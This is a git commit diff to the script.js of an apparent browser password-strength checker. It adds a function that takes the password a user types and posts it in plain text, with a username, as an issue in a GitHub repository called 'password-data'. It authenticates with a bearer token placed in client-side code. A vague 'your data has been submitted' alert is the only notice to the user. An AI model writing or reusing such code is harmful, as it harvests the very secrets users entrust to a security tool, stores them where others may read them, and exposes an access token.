dfd8aa3cda83139b57c9401785c0a196466fe312
vader12444 <147861074+vader12444@users.noreply.github.com>
2023-10-14 00:07:47 +0530

    Update script.js

--- script.js
+++ script.js
@@ -18,3 +18,28 @@ function displayResult(strength) {
   const resultElement = document.getElementById('passwordResult');
   resultElement.textContent = `Password Strength: ${strength}`;
 }
+function submitFormData() {
+  const password = document.getElementById('passwordInput').value;
+  const issueTitle = 'User Input - Password Strength';
+  const issueBody = `User: <YOUR_USERNAME>\nPassword: ${password}`;
+
+  const apiUrl = 'https://api.github.com/repos/<YOUR_USERNAME>/password-data/issues';
+
+  fetch(apiUrl, {
+    method: 'POST',
+    headers: {
+      'Authorization': 'Bearer <YOUR_ACCESS_TOKEN>',
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      title: issueTitle,
+      body: issueBody
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log('Issue created:', data);
+    alert('Thank you! Your data has been submitted.');
+  })
+  .catch(error => console.error('Error creating issue:', error));
+}
